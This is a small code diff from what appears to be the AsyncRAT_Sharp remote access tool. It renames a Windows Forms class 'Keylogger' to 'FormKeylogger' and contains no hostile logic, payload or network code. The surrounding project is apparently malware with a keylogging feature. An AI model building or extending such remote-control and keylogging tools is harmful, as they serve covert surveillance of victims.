@@ -13,9 +13,9 @@ using System.Windows.Forms;
 
 namespace AsyncRAT_Sharp.Forms
 {
-    public partial class Keylogger : Form
+    public partial class FormKeylogger : Form
     {
-        public Keylogger()
+        public FormKeylogger()
         {
             InitializeComponent();
         }
